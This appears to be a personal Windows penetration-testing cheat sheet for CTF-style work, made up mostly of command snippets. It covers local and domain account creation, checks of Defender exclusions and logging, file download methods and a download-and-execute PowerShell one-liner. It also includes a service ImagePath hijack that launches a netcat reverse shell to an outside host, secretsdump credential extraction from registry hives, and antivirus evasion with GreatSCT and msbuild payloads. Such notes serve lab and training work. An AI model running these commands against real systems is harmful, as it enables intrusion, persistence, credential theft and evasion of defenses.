# Commands
## User Related
```powershell
# User info
whoami /all

# User info
net user

# Show groups
net group

# Show local groups
net localgroup <groupname>

# Add user to group
net group <groupname> /add <username>

# Create account
net user <username> <password> /add

# Create account (AD)
# This will force the command to execute on the domain controller instead of the local computer
net user <username> <password> /add /domain
```

## Basic
### System
```powershell
# Shows info about system (Look whether HotFixes are applied or not)
systeminfo

# Show drives
Get-PSDrive -PSProvider FileSystem

# Show hidden data streams
dir /R

# List Defender Exclusions (Requires local admin privileges)
Get-MpPreference | select Exclusion*

# PowerShell Logging Status
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue).EnableTranscripting
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -ErrorAction SilentlyContinue).EnableModuleLogging
[Bool](Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging

# Download and execute files
iex(new-object net.webclient).downloadstring('remote_file')
```
### Download Files
```powershell
# Method 1
(new-object net.webclient).downloadfile(<remote_file>,<output_file>)

# Method 2
Invoke-WebRequest -Uri <source> -OutFile <output_file>

# Method 3
Import-Module BitsTransfer
Start-BitsTransfer -Source <url> -Destination <output_file>

# Method 4
certutil -urlcache -f <url> output_file<>
```

## Services
```bat
:: Get info
sc query <service>
reg query HKLM\System\CurrentControlSet\Services\<service>

:: Edit info
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v <value> /d <data> /f

:: Edit ImagePath and execute netcat command (assuming nc was uploaded before)
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\<service>" /t <type> /v ImagePath /d "nc.exe <ip> <port> -e powershell.exe" /f
```



# Directories
```bash
# Powershell history log file
C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# See any suspicious apps 
"C:\Program Files" or "C:\Program Files (x86)"

# Apps on old windows versions
C:\Data\Users\app

# Code policies and passwords in files
C:\Program Files\windowspowershell\modules\packagemanagement

# Config files
C:\Windows\System32\config

# AD database file location
C:\Windows\NTDS
```

## Configuration Files
Most config files can be found in `C:\Windows\System32\config`     

### Get Info From Registry Hive
```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

## Mount Windows Shares and VHD Files
The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
```bash
mount -t cifs //<ip>/<share> <mount_dir> -o user=<username>,password=<password>
```

### Mount VHD Files
One can use `guestmount` to mount a guest filesystem on the host.     
Install with: `apt install libguestfs-tools`

```bash
guestmount --add <vhd_file> --inspector --ro <mount_dir>
```

#### References
- [https://linux.die.net/man/1/guestmount](https://linux.die.net/man/1/guestmount)



# accesschk - Enumeration
AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify files within a certain service directory.      

```bat
:: Accept eula
accesschk.exe /accepteula

:: Access to services
accesschk.exe <user> -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services

:: Services access
accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

:: Weak folder permission per drive
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\

```    
- [Github](https://github.com/ankh2054/windows-pentest).**  


## Example usage in CTF situations
- [https://snowscan.io/htb-writeup-control/#](https://snowscan.io/htb-writeup-control/#)
- [https://steflan-security.com/windows-privilege-escalation-weak-permission/](https://steflan-security.com/windows-privilege-escalation-weak-permission/)



# AV Evasion
## GreatSCT
```sh
# Download
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT.py
```sh
use 1
list
use 9
set lhost <ip>
sel lport <port>
generate
```
Now start the listener with `msfconsole -r file.rc` and execute the xml payload with:
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

## References
- [https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct](https://book.hacktricks.xyz/windows-hardening/av-bypass#greatsct)
- [https://github.com/GreatSCT/GreatSCT.git](https://github.com/GreatSCT/GreatSCT.git)



# Office Files
Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
```bash
unzip <file>
```

## oletools
```bash
# Download tools
sudo pip3 install -U oletools

# Extract macros
olevba -c <file>
```